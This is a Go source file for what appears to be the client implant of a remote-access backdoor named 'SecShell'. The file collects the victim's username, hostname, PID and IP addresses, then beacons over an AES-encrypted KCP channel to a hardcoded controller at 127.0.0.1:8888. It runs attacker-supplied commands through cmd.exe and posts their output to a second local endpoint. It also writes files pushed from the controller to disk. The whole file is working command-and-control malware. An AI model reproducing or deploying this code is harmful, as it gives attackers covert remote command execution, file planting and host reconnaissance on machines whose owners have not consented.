package main

import (
	"SecShell/config"
	"SecShell/util"
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"encoding/json"
	"fmt"
	uuid "github.com/satori/go.uuid"
	"github.com/xtaci/kcp-go/v5"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/text/encoding/simplifiedchinese"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var agent = InitSystemInfo()

func IsIPv4(address string) bool {
	return strings.Count(address, ":") < 2
}
func randomString(length int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, b[rand.Intn(len(b))])
	}
	return string(result)
}

// 新建agent并,返回系统信息

func InitSystemInfo() *config.SystemInfo {

	agent := &config.SystemInfo{
		AgentId:      uuid.NewV4().String(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		PID:          os.Getpid(),
	}
	u, err := user.Current()

	if err != nil {
		return nil
	}
	agent.UserName = u.Username
	agent.HostName, _ = os.Hostname()
	agent.UserGID = u.Gid
	agent.ResponseURL = "/" + randomString(5)

	interfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	for _, face := range interfaces {
		address, err := face.Addrs()
		if err == nil {
			for _, addr := range address {
				if IsIPv4(addr.String()) {
					agent.IPS = append(agent.IPS, addr.String())
				}
			}
		} else {
			return nil
		}
	}
	return agent
}

func main() {

CONN:
	for {
	
		key := pbkdf2.Key([]byte("@SDW*##@SZZCSDGDSA2"), []byte("salt"), 1024, 32, sha1.New) // 新建一个加密算法
		block, _ := kcp.NewAESBlockCrypt(key)
		conn, err := kcp.DialWithOptions("127.0.0.1:8888", block, 10, 3)
		if err != nil {
			log.Println("Dial is failed")
			continue
		} else {
			systems := InitSystemInfo()
			// 序列化信息
			message, err := json.Marshal(systems)
			if err != nil {
				continue
			}

			sendMeg, err := util.Packaging(message)
			if err != nil {
				continue
			}

			conn.Write(sendMeg)
			go func() {
				tick := time.Tick(5 * time.Second)
				for _ = range tick {
					if conn != nil {
						systems.Response = []byte("heart-beat")
						message, err := json.Marshal(systems)
						if err != nil {
							continue
						}
						sendMeg, err := util.Packaging(message)
						fmt.Println(string(message))
						_, err = conn.Write(sendMeg)
						if err != nil && strings.Contains(err.Error(), "closed") {
							_ = conn.Close()
							conn = nil
						}
					}
				}
			}()
			for {
				if conn == nil {
					time.Sleep(5 * time.Second)
					break
				}
				data := util.UnPackaging(conn)
				fmt.Println(data)
				if len(data) != 0 {
					switch {
					case bytes.Contains(data, []byte("shell")):
						//ExecuteContinually(conn,string(data))
						ExecuteCmd(conn, string(data), systems)
					case bytes.Contains(data, []byte("upload")):
						Upload(conn, data)
					case bytes.Contains(data, []byte("exit-Conn")):
						conn.Close()
						break CONN
					}
				}
			}
		}
	}
}

func Upload(conn *kcp.UDPSession, data []byte) {
	var file *os.File
	var err error
	if bytes.Contains(data, []byte("upload-filename")) {
		arg := bytes.Split(data, []byte("upload-filename "))[1]
		file, err = os.OpenFile(string(arg), os.O_CREATE, 0666)
		defer file.Close()
		fmt.Println("Create file ", string(arg))
		if err != nil {
			return
		}
	}
	b := make([]byte, 8)
	conn.Read(b)
	fsize := binary.LittleEndian.Uint64(b)
	fmt.Println("filesize", fsize)
	for {
		buf := make([]byte, 2048)
		n, _ := conn.Read(buf)
		//结束协程
		if string(buf[:n]) == "finish" {
			break
		}
		file.Write(buf[:n])
	}
	defer file.Close()
}

func ExecuteCmd(conn *kcp.UDPSession, args string, info *config.SystemInfo) {
	//j := 0
	arg := strings.Split(args, "shell")[1]
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", arg)
	cmdout, _ := cmd.Output()
	fmt.Println(cmdout)
	tmp, err := simplifiedchinese.GB18030.NewDecoder().Bytes(cmdout)
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = http.Post(fmt.Sprintf("http://127.0.0.1:9001%v", info.ResponseURL), "application/x-www-form-urlencoded", strings.NewReader(string(tmp)))
	if err != nil {
		fmt.Println(err)
	}
}
